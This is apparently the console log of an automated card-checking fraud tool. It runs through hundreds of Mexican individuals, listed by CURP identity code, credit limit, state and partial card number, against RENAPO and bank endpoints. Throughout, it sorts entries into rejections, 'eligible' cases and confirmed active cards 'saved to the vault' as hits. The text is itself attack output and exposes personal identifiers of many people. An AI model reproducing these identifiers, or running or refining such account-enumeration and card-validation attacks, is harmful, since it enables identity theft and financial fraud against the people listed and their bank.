[2375] ID:3763938 | MALG690625HJCCMS00 | $175,500 | JALISCO | T:1702... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.5s)
[2376] ID:3950881 | GOTR751012HNLNRG06 | $175,500 | NUEVO LEON | T:0837... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.3s)
[2377] ID:4213601 | SASP750704HBCNNB03 | $175,500 | BAJA CALIFOR | T:2349... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:1702 para ID:3763938 ($175,500)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.1s)
[2378] ID:4693835 | ROPA730906MCGDNR08 | $175,500 | COAHUILA | T:2439... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.1s)
[2379] ID:4762314 | SEOA711219MPLRRL05 | $175,500 | PUEBLA | T:4958... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2380] ID:1627368 | FEMM740120MSOLNR09 | $175,490 | SONORA | T:7737... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2381] ID:3073174 | AEAA720602HBCCCL08 | $175,450 | BAJA CALIFOR | T:3897... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.0s)
[2382] ID:3797645 | SISJ690807HNLLLS02 | $175,450 | NUEVO LEON | T:4156... [🔴 OFF] Rechazo bancario (PE1002) (13.8s)
[2383] ID:4671565 | SAMM750411MVRLYD08 | $175,450 | VERACRUZ | T:4037... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.0s)
[2384] ID:4606756 | GANS700927HTSRNR03 | $175,420 | TAMAULIPAS | T:7796... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2385] ID:720800 | GABA720402HNLRLN04 | $175,400 | NUEVO LEON | T:1692... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2386] ID:2420576 | UIMA710401HCSRDN05 | $175,400 | CHIAPAS | T:5919... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.3s)
[2387] ID:2427450 | OUOE770213HNLSSD02 | $175,400 | NUEVO LEON | T:0725... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[2388] ID:2412294 | AUGA781013HJCNDL05 | $175,380 | JALISCO | T:3897... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.2s)
[2389] ID:3226944 | GACR740406HNLRLB02 | $175,330 | NUEVO LEON | T:1247... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.0s)
[2390] ID:300060 | ZALJ710622HPLVPN09 | $175,320 | PUEBLA | T:2506... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.1s)
[2391] ID:3608713 | ROOS770315HVRZRR05 | $175,290 | VERACRUZ | T:7439... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.9s)
[2392] ID:3570036 | LEMM690213HDFNRR04 | $175,270 | CIUDAD DE ME | T:2657... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.0s)
[2393] ID:331796 | MAMX710724HGTLNR09 | $175,240 | GUANAJUATO | T:9037... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2394] ID:1772349 | GOMN760509MCSNLR01 | $175,240 | CHIAPAS | T:4157... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2395] ID:208885 | AEVM750710HCGRLN01 | $175,220 | COAHUILA | T:6198... [🔴 OFF] Rechazo bancario (PE110) (14.7s)
[2396] ID:232505 | REPN710516MTSYNR06 | $175,210 | TAMAULIPAS | T:9343... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[2397] ID:121513 | OOAN710519HNLNYL02 | $175,200 | NUEVO LEON | T:9604... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2398] ID:262351 | KAHE730526HGTNRD08 | $175,200 | GUANAJUATO | T:3389... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2399] ID:1311093 | MEFE690927MMCNRR00 | $175,190 | ESTADO DE ME | T:3699... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2400] ID:1621333 | AIAR710413HHGRLB04 | $175,180 | HIDALGO | T:0427... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2401] ID:3812347 | IALL750204HBCBDS05 | $175,152 | BAJA CALIFOR | T:0997... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.2s)
[2402] ID:846799 | MARA720915HDFRML00 | $175,130 | CIUDAD DE ME | T:1480... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[2403] ID:1732943 | RASA701002MMNMLN03 | $175,120 | MICHOACAN | T:2182... [🔴 OFF] Rechazo bancario (PE110) (15.1s)
[2404] ID:2194376 | ROAA770215HMNMGN04 | $175,120 | MICHOACAN | T:9932... [🔴 OFF] Rechazo bancario (PE1002) (12.8s)
[2405] ID:1608082 | COHR781109HJCRRG00 | $175,100 | JALISCO | T:8299... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.6s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[2406] ID:3637426 | CIRP710721MCHSMT08 | $175,080 | CHIHUAHUA | T:9287... [2407] ID:11129 | FOLA710702HJCLPG05 | $175,050 | JALISCO | T:2051... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.7s)
[2408] ID:1120974 | RUCL690118MNLZNR09 | $175,050 | NUEVO LEON | T:0473... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[2409] ID:232204 | PERA750503HCHRBD06 | $175,000 | CHIHUAHUA | T:9750... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (12.6s)
[2410] ID:448130 | IALY800903MCMBNS01 | $175,000 | COLIMA | T:9417... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.0s)
[2411] ID:547587 | MARE871011MDFRML04 | $175,000 | CIUDAD DE ME | T:5913... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0473 para ID:1120974 ($175,050)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.4s)
[2412] ID:597508 | QUSA740120MDGRLD06 | $175,000 | DURANGO | T:2147... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.9s)
[2413] ID:675925 | FOAR700522MDFLLT08 | $175,000 | CIUDAD DE ME | T:1388... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (15.1s)
[2414] ID:946953 | TEMB740514HMCNRN06 | $175,000 | ESTADO DE ME | T:8629... [🔴 OFF] Contacto preexistente (/confirm-contact) (16.0s)
[2415] ID:983365 | BASM691102HTCLSR03 | $175,000 | TABASCO | T:7054... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2416] ID:1056611 | PEMP720130MCGRGT07 | $175,000 | COAHUILA | T:0571... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2417] ID:1286963 | VAMJ710909HGTZJN03 | $175,000 | GUANAJUATO | T:2245... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (3.8s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2418] ID:1288683 | HERJ770626HCPRJR08 | $175,000 | CAMPECHE | T:6937... [2419] ID:1595493 | OAPS710312MNLRRL09 | $175,000 | NUEVO LEON | T:7245... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.4s)
[2420] ID:1602947 | AUHJ730227HVRZRH03 | $175,000 | VERACRUZ | T:5716... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.5s)
[2421] ID:1632248 | GOFA730516HNTNLL02 | $175,000 | NAYARIT | T:1746... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2422] ID:1752313 | ZEAR710509HMCPLD02 | $175,000 | ESTADO DE ME | T:1121... [🔴 OFF] Rechazo bancario (PE160) (9.6s)
[2423] ID:1820421 | DEMJ800113HDFLRS00 | $175,000 | CIUDAD DE ME | T:8353... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (8.2s)
[2424] ID:1844242 | CARS700821MQRSMN01 | $175,000 | CIUDAD ADOLF | T:4212... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2425] ID:1940063 | GURR710203HOCZML03 | $175,000 | OAXACA | T:5017... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[2426] ID:1961015 | CUID701224HMCRNL09 | $175,000 | ESTADO DE ME | T:9443... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (17.9s)
[2427] ID:2139687 | AASH691124HPLMVG01 | $175,000 | PUEBLA | T:4601... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.6s)
[2428] ID:2168493 | HESG700809HBCRTL07 | $175,000 | BAJA CALIFOR | T:9593... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9443 para ID:1961015 ($175,000)... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE110) (14.3s)
[2429] ID:2168746 | SADJ720723HJCNGN08 | $175,000 | JALISCO | T:9039... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2430] ID:2357632 | LOAL760518HJCPNS09 | $175,000 | JALISCO | T:8390... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2431] ID:2440650 | CIGR690504HTSHRB00 | $175,000 | TAMAULIPAS | T:3127... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.7s)
[2432] ID:2513365 | QUIJ700711HDFRZN00 | $175,000 | CIUDAD DE ME | T:1847... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.3s)
[2433] ID:2559221 | GOOL700917HBSMRS06 | $175,000 | BAJA CALIFOR | T:3724... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2434] ID:2698403 | JARM800111HVRRBG08 | $175,000 | VERACRUZ | T:0931... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (14.4s)
[2435] ID:2784635 | VESS690824HGTGJR04 | $175,000 | GUANAJUATO | T:6833... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.1s)
[2436] ID:3044280 | FIBJ690605HMSGZN04 | $175,000 | MORELOS | T:2413... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.2s)
[2437] ID:3093139 | AENM810414HJCRNS09 | $175,000 | JALISCO | T:8939... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6833 para ID:2784635 ($175,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.6s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[2438] ID:3353490 | EISC710608HMCSDR06 | $175,000 | ESTADO DE ME | T:0920... [2439] ID:3466892 | TEFA710225MNLRLN08 | $175,000 | NUEVO LEON | T:0738... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2440] ID:3811535 | MAVB690703HDFRLR07 | $175,000 | CIUDAD DE ME | T:4598... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2441] ID:4069812 | COHR781109HJCRRG00 | $175,000 | JALISCO | T:5194... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[2442] ID:4231148 | GANL750127HDFRNN04 | $175,000 | CIUDAD DE ME | T:7934... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.5s)
[2443] ID:4888290 | CAVN720910MGRSLR05 | $175,000 | GUERRERO | T:6959... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2444] ID:4866942 | GARF700428HDFRSR08 | $174,990 | CIUDAD DE ME | T:4760... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.3s)
[2445] ID:2909556 | LEGL690510MVRYZT00 | $174,960 | VERACRUZ | T:7976... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:4760 para ID:4866942 ($174,990)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.0s)
[2446] ID:3456849 | AUGF720506HDFGNR06 | $174,960 | CIUDAD DE ME | T:4412... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.9s)
[2447] ID:1122741 | AEVJ740807HQTRTR05 | $174,900 | QUERETARO | T:6956... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.1s)
[2448] ID:131722 | MARI690527MDFRNS01 | $174,880 | CIUDAD DE ME | T:2388... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (10.1s)
[2449] ID:3254288 | LOHE010101HCHPLCA0 | $174,870 | CHIHUAHUA | T:3964... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (11.6s)
[2450] ID:3941153 | OAGE691009HDFLZM08 | $174,870 | CIUDAD DE ME | T:3738... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[2451] ID:1765356 | GORA701108HMCNML08 | $174,860 | CIUDAD NEZAH | T:6355... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (10.7s)
[2452] ID:2927765 | BOPL690618HJCDRS02 | $174,840 | JALISCO | T:3365... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6355 para ID:1765356 ($174,860)... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.5s)
[2453] ID:305285 | PACP730314HMSCVD03 | $174,830 | MORELOS | T:3818... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2454] ID:2495990 | BABX690412MDFTRM08 | $174,760 | CIUDAD DE ME | T:2289... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2455] ID:4292000 | AONS761130MNLLVN08 | $174,740 | NUEVO LEON | T:0138... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2456] ID:1318230 | SAGR741116HTSLRB05 | $174,720 | TAMAULIPAS | T:7948... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE110) (12.4s)
[2457] ID:3097681 | OOTC741025HBCRRR07 | $174,720 | BAJA CALIFOR | T:5002... [🔴 OFF] Contacto preexistente (/confirm-contact) (18.1s)
[2458] ID:4176413 | LOUR700703MSOPRS01 | $174,720 | SINALOA | T:1316... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2459] ID:230761 | VATG711030HDFRVR02 | $174,700 | CIUDAD DE ME | T:2295... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (15.9s)
[2460] ID:4674078 | IATG710228MDFBPB02 | $174,680 | CIUDAD DE ME | T:7093... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:5002 para ID:3097681 ($174,720)... [🟢 HIT #13] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[2461] ID:3632619 | MALO000101HCLTPSA6 | $174,640 | COAHUILA | T:6192... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
[2462] ID:2416070 | AIAG781007HBCNNL02 | $174,630 | BAJA CALIFOR | T:9818... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (18.8s)
[2463] ID:1235514 | VAHD710108HCPZRV09 | $174,600 | CAMPECHE | T:5148... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7093 para ID:4674078 ($174,680)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.9s)
[2464] ID:2881803 | GACA741216HSORNR07 | $174,600 | SINALOA | T:2629... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2465] ID:930099 | OUEF691028HJCSSR03 | $174,560 | JALISCO | T:1310... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (16.5s)
[2466] ID:4832119 | ROSM691209MJCDNR09 | $174,520 | JALISCO | T:2617... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.7s)
[2467] ID:1459935 | GAGD710716HNLRRV08 | $174,420 | NUEVO LEON | T:7907... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.9s)
[2468] ID:1459980 | TEGR730618HNLRRC00 | $174,400 | NUEVO LEON | T:6744... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7907 para ID:1459935 ($174,420)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (19.1s)
[2469] ID:3527053 | NITR700309HJCSRC04 | $174,400 | JALISCO | T:0413... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (12.4s)
[2470] ID:4589635 | BUPM690529MCGSDG01 | $174,400 | COAHUILA | T:2961... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2617 para ID:4832119 ($174,520)... [🔴 OFF] Contacto preexistente (/confirm-contact) (13.1s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2471] ID:304896 | SEGK740702MNLPNR00 | $174,370 | NUEVO LEON | T:2492... [2472] ID:2194088 | AEUJ710618HJCRRS02 | $174,340 | JALISCO | T:7212... [🟢 HIT #14] Tarjeta ACTIVA Confirmada -> Guardado en bóveda!
[🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.1s)
[2473] ID:3877807 | PERF750217HDFRSB07 | $174,340 | CIUDAD DE ME | T:9956... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.8s)
[2474] ID:2218090 | MALC751216HNLRNR08 | $174,330 | NUEVO LEON | T:0338... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2492 para ID:304896 ($174,370)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2475] ID:2478713 | JIJR701105MGTMMS09 | $174,300 | GUANAJUATO | T:8231... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[2476] ID:4257104 | AIAR710924HDFVRF04 | $174,300 | CIUDAD DE ME | T:0856... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7212 para ID:2194088 ($174,340)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.0s)
[2477] ID:1585308 | GAHE760708MGTSRG02 | $174,240 | GUANAJUATO | T:1933... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2478] ID:2887886 | COCJ721120HMCNHR06 | $174,240 | ESTADO DE ME | T:6635... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:9956 para ID:3877807 ($174,340)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2479] ID:3059403 | RUCS700725HHGZRR05 | $174,240 | HIDALGO | T:1833... [🔴 OFF] Rechazo bancario (PE170) (13.2s)
[2480] ID:3099647 | SETL710825HVRRBS02 | $174,240 | VERACRUZ | T:6689... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)

[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0856 para ID:4257104 ($174,300)... [🔴 OFF] Contacto preexistente (/confirm-contact) (12.0s)

[+] Lote de 500 candidatos precargados con límite >= $50,000 (1969+)
[🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[2481] ID:4398547 | TUCE700930MYCNBV06 | $174,240 | YUCATAN | T:0830... [2482] ID:2463055 | SATS690804MSOLPN01 | $174,230 | SONORA | T:5821... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.4s)
[2483] ID:215050 | RUVG710202HJCZLR07 | $174,210 | JALISCO | T:3494... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2484] ID:1049417 | VACR710806HCHLLG00 | $174,210 | CHIHUAHUA | T:7485... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (13.0s)
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.3s)
[2485] ID:245185 | AAGA730118HVRLNL06 | $174,200 | VERACRUZ | T:8727... [2486] ID:1552718 | VIBS760616MCMDRS05 | $174,150 | COLIMA | T:5901... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:7485 para ID:1049417 ($174,210)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2487] ID:2695164 | ROHH000101HDFJRNA1 | $174,150 | CIUDAD DE ME | T:5287... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.6s)
[2488] ID:3495371 | GOEJ751122HNLNSV04 | $174,150 | NUEVO LEON | T:7278... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo bancario (PE170) (14.7s)
[2489] ID:3907262 | GURA730520MCSTNN00 | $174,140 | CHIAPAS | T:4106... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[2490] ID:3182851 | GUGB731220MASTLT09 | $174,120 | AGUASCALIENT | T:5199... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2491] ID:1773087 | ROGT730204HMSDRL06 | $174,110 | MORELOS | T:5797... [🔴 OFF] Contacto preexistente (/confirm-contact) (20.0s)
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2492] ID:606350 | RAOM770710HVRMMM08 | $174,080 | VERACRUZ | T:9924... [2493] ID:2100716 | ROMG700114HMCDRR01 | $174,080 | ESTADO DE ME | T:7039... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2494] ID:2765905 | COGC740212MBCRML07 | $174,030 | BAJA CALIFOR | T:0914... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2495] ID:793140 | MAAJ720911HJCLCR09 | $174,020 | JALISCO | T:8147... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[2496] ID:159648 | PEPM721007MVZRLR05 | $174,000 | VERACRUZ | T:5511... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2497] ID:335602 | DOMP710328MZSRRL06 | $174,000 | ZACATECAS | T:6719... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (16.3s)
[2498] ID:336846 | GARR730520HZSRMC06 | $174,000 | ZACATECAS | T:5943... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:0914 para ID:2765905 ($174,030)... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (8.8s)
[2499] ID:555378 | ZUJS720609MDFGMG02 | $174,000 | CIUDAD DE ME | T:5022... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.7s)
[2500] ID:591250 | TERJ700204HBCRYN09 | $174,000 | BAJA CALIFOR | T:8333... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6719 para ID:335602 ($174,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2501] ID:599619 | PEHL690202HDFRRS00 | $174,000 | CIUDAD DE ME | T:2870... [⚠️ RETRY] Timeout global de verificación (22s) (22.0s)
[2502] ID:835915 | EAAT691112MDFSLR06 | $174,000 | CIUDAD DE ME | T:1102... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.0s)
[2503] ID:862435 | VACX760422HNLZBN08 | $174,000 | NUEVO LEON | T:6295... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2504] ID:868026 | EAGL690711MTCSRT05 | $174,000 | TABASCO | T:6829... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.8s)
[2505] ID:990316 | MOBH690830HMCRNG07 | $174,000 | ESTADO DE ME | T:9540... [🔴 OFF] Rechazo bancario (PE170) (14.4s)
[2506] ID:1111338 | GAGD710716HNLRRV08 | $174,000 | NUEVO LEON | T:2374... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.7s)
[2507] ID:1172376 | JICE700406MDFMSL08 | $174,000 | CIUDAD DE ME | T:2328... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (12.2s)
[2508] ID:1254364 | LOGH721214HTSPRG02 | $174,000 | TAMAULIPAS | T:1985... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:2374 para ID:1111338 ($174,000)... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (18.8s)
[2509] ID:1788725 | MAVC720517HDFRZS02 | $174,000 | CIUDAD DE ME | T:9650... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.4s)
[2510] ID:1999068 | OAPM731108HVRLRR03 | $174,000 | VERACRUZ | T:6976... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.5s)
[2511] ID:2165871 | ROHE710714HGTDRD01 | $174,000 | GUANAJUATO | T:4590... [🔴 OFF] Contacto preexistente (/confirm-contact) (15.2s)
[2512] ID:2358103 | HEOJ830605HSORCS05 | $174,000 | SINALOA | T:6419... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.5s)
[2513] ID:2405867 | EICV710720HYCSSC02 | $174,000 | YUCATAN | T:6991... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (5.2s)
[2514] ID:2407970 | CAMO740414HMCSTS03 | $174,000 | ESTADO DE ME | T:3794... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (7.3s)
[2515] ID:2744162 | EUBF710224HMCSLD01 | $174,000 | ESTADO DE ME | T:2015... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.7s)
[2516] ID:2822589 | CASV710915MDFSNR07 | $174,000 | CIUDAD DE ME | T:6057... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (15.2s)
[2517] ID:3023067 | IIHM700701HDFBRR06 | $174,000 | CIUDAD DE ME | T:5825... [🌟 PRE-POOL ON] Elegible! -> Enviado a verificación de tarjeta (11.6s)
[2518] ID:3048494 | PEGM691223HCHNRR03 | $174,000 | CHIHUAHUA | T:5675... 
[💳 PRE-POOL CONSUMER] Verificando Tarjeta T:6057 para ID:2822589 ($174,000)... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.3s)
[2519] ID:3224844 | SOGJ740429HMCLNV02 | $174,000 | ESTADO DE ME | T:2350... [🔴 CARD INACTIVE] (no pide password (bloqueada o no cliente))
[🔴 OFF] Contacto preexistente (/confirm-contact) (13.9s)
[2520] ID:3538178 | CUPG741020HMNVRL06 | $174,000 | MICHOACAN | T:2978... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.6s)
[2521] ID:3556399 | SAMR690128HNLLRM06 | $174,000 | NUEVO LEON | T:4752... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.2s)
[2522] ID:3580895 | FILG691030HCHRZR05 | $174,000 | CHIHUAHUA | T:7641... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (13.3s)
[2523] ID:3738810 | CASC770619HSOSNR04 | $174,000 | SONORA | T:1508... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (6.0s)
[2524] ID:3938436 | TELO700703HGRRPM03 | $174,000 | GUERRERO | T:4562... [🔴 OFF] Derivación LikeU Pro (/derivation-pro) (16.8s)
[2525] ID:4196588 | OINM710414HTSLRR04 | $174,000 | TAMAULIPAS | T:7939... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.3s)
[2526] ID:4273889 | GOCL710424MASMHN02 | $174,000 | AGUASCALIENT | T:2538... [🔴 OFF] Contacto preexistente (/confirm-contact) (14.4s)
[2527] ID:4464484 | MAAJ720911HJCLCR09 | $174,000 | JALISCO | T:9584... [🔴 OFF] Rechazo RENAPO/Bloqueado (400: OB-ORQ-05) (4.8s)
